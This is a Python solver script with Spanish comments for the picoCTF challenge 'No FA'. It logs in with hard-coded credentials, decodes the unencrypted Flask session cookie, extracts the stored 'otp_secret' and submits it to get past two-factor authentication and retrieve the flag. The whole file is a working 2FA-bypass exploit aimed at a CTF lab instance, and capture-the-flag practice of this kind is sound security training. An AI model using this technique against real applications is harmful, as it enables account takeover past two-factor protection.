import requests
import base64
import zlib
import json

URL = "http://foggy-cliff.picoctf.net:62640"

USERNAME = "admin"
PASSWORD = "apple@123"


# DECODIFICAR COOKIE DE FLASK

def decode_flask_session(cookie):

    print()
    print("=" * 60)
    print("  Analizando cookie Flask...")
    print("=" * 60)

    parts = cookie.split(".")

    print(f"[+] Partes: {len(parts)}")

    if len(parts) < 3:
        print("[-] La cookie no tiene el formato esperado.")
        return None

    payload = parts[0]

    # Las cookies Flask comprimidas comienzan con un punto.
    if payload == "":
        payload = parts[1]
        compressed = True
    else:
        compressed = False

    try:

        # Base64 URL-safe
        padding = "=" * (-len(payload) % 4)

        raw = base64.urlsafe_b64decode(
            payload + padding
        )

        if compressed:
            raw = zlib.decompress(raw)

        print("[+] Payload decodificado.")
        print(f"[+] Bytes: {len(raw)}")

        session_data = json.loads(
            raw.decode("utf-8")
        )

        print()
        print("[+] Contenido de la sesión:")
        print(
            json.dumps(
                session_data,
                indent=4
            )
        )

        print()
        print("=" * 60)
        print("  DATOS DE SESIÓN")
        print("=" * 60)

        for key, value in session_data.items():
            print(f"{key}: {value}")

        print("=" * 60)

        return session_data

    except Exception as e:

        print()
        print("[-] Error al decodificar la sesión:")
        print(e)

        return None


# login

print("=" * 60)
print("  No FA - picoCTF")
print("=" * 60)

print("[*] Iniciando sesión...")

s = requests.Session()

try:

    r = s.post(
        f"{URL}/login",
        data={
            "username": USERNAME,
            "password": PASSWORD
        },
        allow_redirects=False,
        timeout=10
    )

except requests.exceptions.RequestException as e:

    print()
    print("[-] Error de conexión:")
    print(e)
    print()
    print("[-] Comprobar que la instancia siga activa.")
    exit()


print(f"[+] Status:   {r.status_code}")
print(f"[+] Redirect: {r.headers.get('Location')}")

if r.status_code != 302:

    print()
    print("[-] El login no fue exitoso.")
    print("[-] Verificar la contraseña o la instancia.")
    exit()

print("[+] Login correcto.")

# Obtener cookie Flask
cookie = s.cookies.get("session")

if not cookie:

    print("[-] No se obtuvo la cookie de sesion.")
    exit()

print("[+] Cookie de sesion obtenida:")
print(cookie)


# ANALIZAR SESION

session_data = decode_flask_session(cookie)

if not session_data:

    print()
    print("[-] No fue posible analizar la sesion.")
    exit()

# OBTENER OTP

otp = session_data.get("otp_secret")

if not otp:

    print()
    print("[-] No se encontró otp_secret en la sesion.")
    exit()

print()
print(f"[+] OTP encontrado: {otp}")

# ENVIAR OTP

print()
print("[*] Enviando OTP...")

try:

    r = s.post(
        f"{URL}/two_fa",
        data={
            "otp": otp
        },
        allow_redirects=False,
        timeout=10
    )

except requests.exceptions.RequestException as e:

    print()
    print("[-] Error de conexión:")
    print(e)
    exit()


print(f"[+] Status:   {r.status_code}")
print(f"[+] Redirect: {r.headers.get('Location')}")


if r.status_code != 302:

    print()
    print("[-] El OTP no fue aceptado.")
    exit()

if r.headers.get("Location") != "/":

    print()
    print("[-] La autenticacion 2FA no redirigio a /.")
    exit()

print()
print("[+] ¡2FA superado!")


# acceder a la pagina principal

print("[*] Accediendo a /...")

try:

    r = s.get(
        f"{URL}/",
        timeout=10
    )

except requests.exceptions.RequestException as e:

    print()
    print("[-] Error de conexión:")
    print(e)
    exit()


print(f"[+] Status: {r.status_code}")

# BUSCAR FLAG

print()
print("=" * 60)

if "picoCTF{" in r.text:

    start = r.text.find("picoCTF{")
    end = r.text.find("}", start)

    flag = r.text[start:end + 1]

    print("  ¡¡¡ FLAG ENCONTRADA !!!")
    print()
    print(flag)

else:

    print("[-] No se encontro la flag en la respuesta.")

print("=" * 60)